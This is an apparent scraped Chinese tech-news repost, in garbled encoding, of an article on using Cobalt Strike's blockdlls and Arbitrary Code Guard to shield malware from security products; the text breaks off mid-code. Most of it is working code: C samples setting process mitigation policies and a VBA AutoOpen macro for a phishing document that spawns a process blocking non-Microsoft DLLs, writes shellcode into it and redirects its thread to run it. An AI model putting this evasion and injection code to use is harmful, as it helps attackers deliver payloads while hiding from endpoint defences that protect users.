<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ | æå®¢å¿«è¨Š</title><meta property="og:title" content="å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ - æå®¢å¿«è¨Š"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p3.pstatp.com/large/pgc-image/18a6236e237648dcbd6f77ca0904c065"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><meta property="article:published_time" content="2020-10-29T21:08:07+08:00"><meta property="article:modified_time" content="2020-10-29T21:08:07+08:00"><meta name=Keywords content><meta name=description content="å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶"><meta name=author content="æå®¢å¿«è¨Š"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/8a7e234.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>ğŸ¤“ æå®¢å¿«è®¯ Geek Bank</a></h1><p class=description>ä¸ºä½ å¸¦æ¥æœ€å…¨çš„ç§‘æŠ€çŸ¥è¯† ğŸ§¡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>çŒœä½ å–œæ­¡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=ç§‘æŠ€>ç§‘æŠ€</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=éŠæˆ²>éŠæˆ²</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=ç§‘å­¸>ç§‘å­¸</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>ç§‘æŠ€</a></span></div><div class=post-content><div><p>åœ¨Cobalt Strikeçš„è¿‘æœŸæ›´æ–°ä¸­ï¼ŒåŠ å…¥äº†blockdllså‘½ä»¤ï¼Œå®ƒå¯åœ¨æ”»å‡»è€…æ´¾ç”Ÿå­è¿›ç¨‹æ—¶é˜»æ­¢ç¬¬ä¸‰æ–¹DLLçš„åŠ è½½ã€‚è¿™å°±ä½¿å®‰å…¨äº§å“åœ¨è¿›ç¨‹åˆ›å»ºæ—¶æ— æ³•é€šè¿‡DLLåŠ è½½è¿›è¡Œç›‘æ§å’Œå¯ç–‘æƒ…å†µä¸ŠæŠ¥ã€‚</p><p>åœ¨è¿›è¡Œè¿‡å‡ æ¬¡å†…éƒ¨åŸç†çš„è®¨è®ºåï¼Œæˆ‘è§‰å¾—æœ‰å¿…è¦å†™ä¸€ç¯‡æ–‡ç« å±•ç¤ºå…¶ç”¨æ³•å’ŒèƒŒåçš„åŸç†ï¼Œå¦‚ä½•ç”¨å®ƒæ¥ä¿æŠ¤æˆ‘ä»¬çš„æ¶æ„è½¯ä»¶ï¼Œé˜»æ­¢å®‰å…¨è½¯ä»¶çš„ç›‘æ§ã€‚</p><h1>blockdlls</h1><p>blockdllsæ˜¯åœ¨Cobalt Strikeçš„3.14ç‰ˆæœ¬ä¸­å‡ºç°çš„ï¼Œç”¨äºä¿æŠ¤æ´¾ç”Ÿçš„å­è¿›ç¨‹ä¸å—ç¬¬ä¸‰æ–¹DLLçš„å¹²æ‰°ã€‚ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€åœ¨ä¸€ä¸ªæ´»åŠ¨çš„ä¼šè¯ä¸­ä½¿ç”¨blockdllså‘½ä»¤ï¼Œç„¶åæ´¾ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼ˆä½¿ç”¨spawnå‘½ä»¤ï¼‰ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/18a6236e237648dcbd6f77ca0904c065><p class=pgc-img-caption></p></div><p>ä¸€æ—¦æˆ‘ä»¬çš„å­è¿›ç¨‹å‡ºç°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ProcessHackerä¸­çœ‹åˆ°ç±»ä¼¼è¯­å¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/d8c2ff4b8c7c41cda836e41d40568560><p class=pgc-img-caption></p></div><p>æ­¤æ—¶å¦‚æœä¸€ä¸ªæ²¡æœ‰è¢«å¾®è½¯ç­¾åçš„DLLè¯•å›¾åŠ è½½åˆ°è¿›ç¨‹ä¸­ï¼Œå°±ä¼šå‡ºç°ä¸€ä¸ªå¾ˆè¯¦ç»†çš„é”™è¯¯ï¼Œä¾‹å¦‚ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f29493fb053a4347b0efd5a1f08a10c6><p class=pgc-img-caption></p></div><p>é‚£ä¹ˆï¼ŒCobalt Strikeæ˜¯å¦‚ä½•å®ç°è¿™ä¸€åŠŸèƒ½çš„å‘¢ï¼Ÿå¦‚æœæˆ‘ä»¬æœç´¢CS beaconçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ ä¼šçœ‹åˆ°å¯¹UpdateProcThreadAttributeçš„å¼•ç”¨ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/058beecd2b3947208a5dfc093d0d0413><p class=pgc-img-caption></p></div><p>ä¸Šå›¾ä¸­ï¼Œ0x20007çš„Attributeå‚æ•°å®é™…ä¸Šå’ŒPROC_THREAD_ATTRIBUTE_MITIGATION_POLICYæœ‰å…³ï¼Œè€Œ0x100000000000çš„å€¼è§£æä¸ºPROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONã€‚å¯ä»¥çœ‹å‡ºï¼ŒCobalt Strikeè°ƒç”¨äº†CreateProcessAPIï¼Œå…¶ä¸­æ¶‰åŠä¸€ä¸ªSTARTUPINFOEXç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“åŒ…å«ä¸€ä¸ªå®‰å…¨ç­–ç•¥ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯¥ç­–ç•¥é˜»æ­¢äº†éå¾®è½¯ç­¾åçš„DLLåŠ è½½ã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³è‡ªå·±é‡ç°ï¼Œå¯ä»¥åˆ©ç”¨ä»¥ä¸‹ä»£ç ï¼š</p><pre>#include &lt;Windows.h&gt;int main(){ STARTUPINFOEXA si; PROCESS_INFORMATION pi; SIZE_T size = 0; BOOL ret; // Required for a STARTUPINFOEXA ZeroMemory(&amp;si, sizeof(si)); si.StartupInfo.cb = sizeof(STARTUPINFOEXA); si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT; // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated InitializeProcThreadAttributeList(NULL, 1, 0, &amp;size); // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc( GetProcessHeap(), 0, size ); // Initialise our list  InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;size); // Enable blocking of non-Microsoft signed DLLs DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON; // Assign our attribute UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, sizeof(policy), NULL, NULL); // Finally, create the process ret = CreateProcessA( NULL, (LPSTR)"C:\\Windows\\System32\\cmd.exe", NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si), &amp;pi );}</pre><h1>è¿›ä¸€æ­¥äº†è§£</h1><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†Cobalt Strikeå¦‚ä½•å®ç°è¯¥åŠŸèƒ½ï¼Œä½†åœ¨æ¸—é€çš„æŸäº›é˜¶æ®µè¿™ä¸ªåŠŸèƒ½å¹¶ä¸èƒ½è¦†ç›–ï¼Œè¿™å°±ç»™äº†å®‰å…¨è½¯ä»¶å¯ä¹˜ä¹‹æœºã€‚è®©æˆ‘ä»¬çœ‹çœ‹ä¸€ä¸ªå¸¸è§çš„é’“é±¼åœºæ™¯ï¼Œæˆ‘ä»¬è¯•å›¾é€šè¿‡ä¸€ä¸ªåŒ…å«æ¶æ„å®çš„æ–‡æ¡£æ¥è¿›è¡Œbeaconæ¤å…¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ca04a0eb32ed4a3b9ee097335872396f><p class=pgc-img-caption></p></div><p>ä¸€èˆ¬å…¥ä¾µæµç¨‹ä¸­ï¼Œåœ¨ä¸Šå›¾çº¢è‰²æ–¹æ¡†çš„éƒ¨åˆ†ï¼Œblockdllsæ— æ³•ç”Ÿæ•ˆï¼Œä½†åœ¨è“è‰²æ–¹æ¡†ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”±Cobalt Strikeæ‰€æ´¾ç”Ÿçš„æ¯ä¸ªå­è¿›ç¨‹éƒ½å—åˆ°äº†â€œå®‰å…¨â€ç­–ç•¥çš„ä¿æŠ¤ã€‚è¿™é‡Œæ‰€é¢ä¸´çš„é£é™©æ˜¯å®‰å…¨äº§å“ä¼šå°†å…¶DLLåŠ è½½åˆ°è¿ç§»è¿›ç¨‹ï¼ˆè¿™é‡Œæ˜¾ç¤ºä¸ºInternet Explorerï¼‰ï¼Œæ£€æŸ¥å…¶ä¸­æ˜¯å¦æœ‰æ¶æ„æ´»åŠ¨ã€‚</p><p>ä¸è¿‡ï¼Œç»“åˆä¸Šè¿°ä»£ç å’ŒPROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONé€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥è¾ƒå¥½åœ°è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><pre>POC to spawn process with PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON mitigation enabled' by @_xpn_'' Thanks to https://github.com/itm4n/VBA-RunPE and https://github.com/christophetd/spoofing-office-macroConst EXTENDED_STARTUPINFO_PRESENT = &amp;H80000Const HEAP_ZERO_MEMORY = &amp;H8&amp;Const SW_HIDE = &amp;H0&amp;Const MAX_PATH = 260Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &amp;H20007Const MAXIMUM_SUPPORTED_EXTENSION = 512Const SIZE_OF_80387_REGISTERS = 80Const MEM_COMMIT = &amp;H1000Const MEM_RESERVE = &amp;H2000Const PAGE_READWRITE = &amp;H4Const PAGE_EXECUTE_READWRITE = &amp;H40Const CONTEXT_FULL = &amp;H10007Private Type PROCESS_INFORMATION hProcess As LongPtr hThread As LongPtr dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUP_INFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Byte hStdInput As LongPtr hStdOutput As LongPtr hStdError As LongPtrEnd TypePrivate Type STARTUPINFOEX STARTUPINFO As STARTUP_INFO lpAttributelist As LongPtrEnd TypePrivate Type DWORD64 dwPart1 As Long dwPart2 As LongEnd TypePrivate Type FLOATING_SAVE_AREA ControlWord As Long StatusWord As Long TagWord As Long ErrorOffset As Long ErrorSelector As Long DataOffset As Long DataSelector As Long RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte Spare0 As LongEnd TypePrivate Type CONTEXT ContextFlags As Long Dr0 As Long Dr1 As Long Dr2 As Long Dr3 As Long Dr6 As Long Dr7 As Long FloatSave As FLOATING_SAVE_AREA SegGs As Long SegFs As Long SegEs As Long SegDs As Long Edi As Long Esi As Long Ebx As Long Edx As Long Ecx As Long Eax As Long Ebp As Long Eip As Long SegCs As Long EFlags As Long Esp As Long SegSs As Long ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As ByteEnd TypePrivate Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _ ByVal lpApplicationName As String, _ ByVal lpCommandLine As String, _ lpProcessAttributes As Long, _ lpThreadAttributes As Long, _ ByVal bInheritHandles As Long, _ ByVal dwCreationFlags As Long, _ lpEnvironment As Any, _ ByVal lpCurrentDriectory As String, _ ByVal lpStartupInfo As LongPtr, _ lpProcessInformation As PROCESS_INFORMATION _) As LongPrivate Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwAttributeCount As Integer, _ ByVal dwFlags As Integer, _ ByRef lpSize As Integer _) As BooleanPrivate Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwFlags As Integer, _ ByVal lpAttribute As Long, _ ByVal lpValue As LongPtr, _ ByVal cbSize As Integer, _ ByRef lpPreviousValue As Integer, _ ByRef lpReturnSize As Integer _) As BooleanPrivate Declare Function WriteProcessMemory Lib "kernel32.dll" ( _ ByVal hProcess As LongPtr, _ ByVal lpba seAddress As Long, _ ByRef lpBuffer As Any, _ ByVal nSize As Long, _ ByVal lpNumberOfBytesWritten As Long _) As BooleanPrivate Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As LongPrivate Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare Function SetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _ ByVal hHeap As LongPtr, _ ByVal dwFlags As Long, _ ByVal dwBytes As Long _) As LongPtrPrivate Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtrPrivate Declare Function VirtualAllocEx Lib "kernel32" ( _ ByVal hProcess As Long, _ ByVal lpAddress As Long, _ ByVal dwSize As Long, _ ByVal flAllocationType As Long, _ ByVal flProtect As Long _) As LongSub AutoOpen() Dim pi As PROCESS_INFORMATION Dim si As STARTUPINFOEX Dim nullStr As String Dim pid, result As Integer Dim threadAttribSize As Integer Dim processPath As String Dim val As DWORD64 Dim ctx As CONTEXT Dim alloc As Long Dim shellcode As Variant Dim myByte As Long ' Shellcode goes here (jmp $) shellcode = Array(&amp;HEB, &amp;HFE) ' Path of process to spawn processPath = "C:\\windows\\system32\\notepad.exe" ' Specifies PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON val.dwPart1 = 0 val.dwPart2 = &amp;H1000 ' Initialize process attribute list result = InitializeProcThreadAttributeList(ByVal 0&amp;, 1, 0, threadAttribSize) si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize) result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize) ' Set our mitigation policy result = UpdateProcThreadAttribute( _ si.lpAttributelist, _ 0, _ PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _ VarPtr(val), _ Len(val), _ ByVal 0&amp;, _ ByVal 0&amp; _ ) si.STARTUPINFO.cb = LenB(si) si.STARTUPINFO.dwFlags = 1 ' Spawn our process which will only allow MS signed DLL's result = CreateProcess( _ nullStr, _ processPath, _ ByVal 0&amp;, _ ByVal 0&amp;, _ 1&amp;, _ &amp;H80014, _ ByVal 0&amp;, _ nullStr, _ VarPtr(si), _ pi _ ) ' Alloc memory (RWX for this POC, because... yolo) in process to write our shellcode to alloc = VirtualAllocEx( _ pi.hProcess, _ 0, _ 11000, _ MEM_COMMIT + MEM_RESERVE, _ PAGE_EXECUTE_READWRITE _ ) ' Write our shellcode For offset = LBound(shellcode) To UBound(shellcode) myByte = shellcode(offset) result = WriteProcessMemory(pi.hProcess, alloc + offset, myByte, 1, ByVal 0&amp;) Next offset ' Point EIP register to allocated memory ctx.ContextFlags = CONTEXT_FULL result = GetThreadContext(pi.hThread, ctx) ctx.Eip = alloc result = SetThreadContext(pi.hThread, ctx) ' Resume execution ResumeThread (pi.hThread)End Sub</pre><p>å¦‚æœä½¿ç”¨æ­£ç¡®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®‰å…¨è½¯ä»¶æ‰€èƒ½æ£€æµ‹çš„é˜¶æ®µå‡å°‘äº†ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/3b4d25abb195478c9af753145099710e><p class=pgc-img-caption></p></div><p>é‚£ä¹ˆå‰©ä¸‹çš„çº¢è‰²é˜¶æ®µå‘¢ï¼Ÿä¹Ÿè¿˜æ˜¯æœ‰ä¸€äº›æ–¹æ³•å¯ä»¥è¿›è¡Œä¿æŠ¤ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨å«æœ‰å‚æ•°ProcessSignaturePolicyçš„SetMitigationPolicyï¼Œè¿™ä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶å¼•å…¥ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸éœ€è¦é€šè¿‡CreateProcessé‡æ–°æ‰§è¡Œã€‚ç„¶è€Œï¼Œå¾ˆå¯èƒ½åœ¨VBAæ–‡ä»¶è¿è¡Œä¹‹å‰ï¼ŒæŸäº›DLLå°±å·²ç»åŠ è½½åˆ°Wordçš„åœ°å€ç©ºé—´ä¸­äº†ï¼ŒæŸäº›å±é™©æ“ä½œä¼šå¢åŠ è¢«æ£€æµ‹åˆ°çš„æœºä¼šã€‚</p><h1>ä»»æ„ä»£ç ä¿æŠ¤</h1><p>åœ¨é˜…è¯»æœ¬æ–‡æ—¶ï¼Œä½ å¯èƒ½æ²¡å¬è¿‡ä»»æ„ä»£ç ä¿æŠ¤ï¼ˆACGï¼‰ã€‚è¿™æ˜¯Windowsç³»ç»Ÿçš„å¦ä¸€ä¸ªå®‰å…¨ç­–ç•¥ï¼Œå®ƒå¯ä»¥é˜»æ­¢å†…å­˜ä»£ç æ³¨å…¥ã€‚</p><p>è¦æŸ¥çœ‹è¿™ä¸ªç­–ç•¥çš„å®é™…æ•ˆæœï¼Œå…ˆè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå°ç¨‹åºï¼Œå¹¶å°è¯•ä½¿ç”¨SetMitigationPolicyæ·»åŠ ACGï¼š</p><pre>#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;int main(){ STARTUPINFOEX si; DWORD oldProtection; PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy; ZeroMemory(&amp;policy, sizeof(policy)); policy.ProhibitDynamicCode = 1; void* mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (mem == NULL) { printf("[!] Error allocating RWX memory\n"); } else { printf("[*] RWX memory allocated: %p\n", mem); } printf("[*] Now running SetProcessMitigationPolicy to apply PROCESS_MITIGATION_DYNAMIC_CODE_POLICY\n"); // Set our mitigation policy if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &amp;policy, sizeof(policy)) == false) { printf("[!] SetProcessMitigationPolicy failed\n"); return 0; } // Attempt to allocate RWX protected memory (this will fail) mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (mem == NULL) { printf("[!] Error allocating RWX memory\n"); } else { printf("[*] RWX memory allocated: %p\n", mem); } void* ntAllocateVirtualMemory = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateVirtualMemory"); // Let's also try a VirtualProtect to see if we can update an existing page to RWX if (!VirtualProtect(ntAllocateVirtualMemory, 4096, PAGE_EXECUTE_READWRITE, &amp;oldProtection)) { printf("[!] Error updating NtAllocateVirtualMemory [%p] memory to RWX\n", ntAllocateVirtualMemory); } else { printf("[*] NtAllocateVirtualMemory [%p] memory updated to RWX\n", ntAllocateVirtualMemory); }}</pre><p>ç¼–è¯‘å¹¶æ‰§è¡Œåï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å¦‚ä¸‹è¯­å¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/85ac869d8c6e4e1d88488b97a3599404><p class=pgc-img-caption></p></div><p>æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°åœ¨SetProcessMitigationPolicyæ‰§è¡Œåï¼Œåˆ†é…RWXå†…å­˜é¡µå¤±è´¥äº†ã€‚</p><p>ä¸ºä»€ä¹ˆè¦æèµ·è¿™ä¸ªï¼Ÿå› ä¸ºæˆ‘ä»¬ç¡®å®çœ‹åˆ°äº†ä¸€äº›EDR DLLè¢«æ³¨å…¥çš„ä¾‹å­ï¼Œä¾‹å¦‚ï¼Œ@Sektor7Netå‘æˆ‘ä»¬å±•ç¤ºäº†Crowdstrike Falconä¸­çš„æŸä¸ªDLLï¼Œå®ƒä¸å—PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONçš„å½±å“:</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ae2f5491a25b454d9e566308729de80a><p class=pgc-img-caption></p></div><p>ä½†æ˜¯ï¼Œå¾ˆå¤šEDRäº§å“éƒ½ä¼šåšçš„ä¸€ä»¶äº‹å°±æ˜¯æ ¹æ®æŸäº›åŠŸèƒ½åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½®hookï¼ˆç›¸å…³æ–‡ç« ï¼‰ã€‚ç”±äºhooké€šå¸¸éœ€è¦ä¿®æ”¹ç°æœ‰çš„å¯æ‰§è¡Œpageï¼Œæ·»åŠ Trampolineï¼Œæ‰€ä»¥é€šå¸¸éœ€è¦è°ƒç”¨VirtualProtectæ¥æ›´æ–°å†…å­˜ä¿æŠ¤ã€‚å¦‚æœæˆ‘ä»¬ç§»é™¤å®ƒåˆ›å»ºRWXå†…å­˜é¡µçš„èƒ½åŠ›ï¼Œå°±èƒ½è¿«ä½¿ä¸€ä¸ªMicrosoftç­¾åDLLåŠ è½½å¤±è´¥ã€‚</p><p>è¦åœ¨æˆ‘ä»¬çš„VBAä»£ç ä¸­å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ONé€‰é¡¹ï¼Œå¯ç”¨è¿™ç§ä¿æŠ¤ï¼š</p><pre>' POC to spawn process with PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON and PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON mitigation enabled' by @_xpn_'' Thanks to https://github.com/itm4n/VBA-RunPE and https://github.com/christophetd/spoofing-office-macroConst EXTENDED_STARTUPINFO_PRESENT = &amp;H80000Const HEAP_ZERO_MEMORY = &amp;H8&amp;Const SW_HIDE = &amp;H0&amp;Const MAX_PATH = 260Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &amp;H20007Const MAXIMUM_SUPPORTED_EXTENSION = 512Const SIZE_OF_80387_REGISTERS = 80Const MEM_COMMIT = &amp;H1000Const MEM_RESERVE = &amp;H2000Const PAGE_READWRITE = &amp;H4Const PAGE_EXECUTE_READWRITE = &amp;H40Const CONTEXT_FULL = &amp;H10007Private Type PROCESS_INFORMATION hProcess As LongPtr hThread As LongPtr dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUP_INFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Byte hStdInput As LongPtr hStdOutput As LongPtr hStdError As LongPtrEnd TypePrivate Type STARTUPINFOEX STARTUPINFO As STARTUP_INFO lpAttributelist As LongPtrEnd TypePrivate Type DWORD64 dwPart1 As Long dwPart2 As LongEnd TypePrivate Type FLOATING_SAVE_AREA ControlWord As Long StatusWord As Long TagWord As Long ErrorOffset As Long ErrorSelector As Long DataOffset As Long DataSelector As Long RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte Spare0 As LongEnd TypePrivate Type CONTEXT ContextFlags As Long Dr0 As Long Dr1 As Long Dr2 As Long Dr3 As Long Dr6 As Long Dr7 As Long FloatSave As FLOATING_SAVE_AREA SegGs As Long SegFs As Long SegEs As Long SegDs As Long Edi As Long Esi As Long Ebx As Long Edx As Long Ecx As Long Eax As Long Ebp As Long Eip As Long SegCs As Long EFlags As Long Esp As Long SegSs As Long ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As ByteEnd TypePrivate Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _ ByVal lpApplicationName As String, _ ByVal lpCommandLine As String, _ lpProcessAttributes As Long, _ lpThreadAttributes As Long, _ ByVal bInheritHandles As Long, _ ByVal dwCreationFlags As Long, _ lpEnvironment As Any, _ ByVal lpCurrentDriectory As String, _ ByVal lpStartupInfo As LongPtr, _ lpProcessInformation As PROCESS_INFORMATION _) As LongPrivate Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwAttributeCount As Integer, _ ByVal dwFlags As Integer, _ ByRef lpSize As Integer _) As BooleanPrivate Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwFlags As Integer, _ ByVal lpAttribute As Long, _ ByVal lpValue As LongPtr, _ ByVal cbSize As Integer, _ ByRef lpPreviousValue As Integer, _ ByRef lpReturnSize As Integer _) As BooleanPrivate Declare Function WriteProcessMemory Lib "kernel32.dll" ( _ ByVal hProcess As LongPtr, _ ByVal lpba seAddress As Long, _ ByRef lpBuffer As Any, _ ByVal nSize As Long, _ ByVal lpNumberOfBytesWritten As Long _) As BooleanPrivate Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As 